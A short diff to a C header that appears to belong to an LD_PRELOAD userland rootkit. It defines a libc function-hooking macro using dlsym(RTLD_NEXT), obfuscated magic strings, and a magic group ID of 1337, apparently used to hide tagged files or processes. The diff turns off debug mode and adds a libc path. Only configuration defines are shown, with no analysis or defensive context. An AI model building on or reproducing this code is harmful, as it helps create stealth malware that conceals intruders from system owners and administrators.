@@ -1,9 +1,9 @@
-#define DEBUG
 #ifndef RTLD_NEXT
 #define RTLD_NEXT ((void *) -11) 
 #endif
 #define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
 #define CLEAN(var) clean(var, strlen(var))
+#define LIBC "/lib/libc.so.6"
 #define MAGIC "\x47\x45\x59\x42\x43" // moshi
 #define PROC "\x5\x5a\x58\x45\x49"
 #define MAGICGID 1337
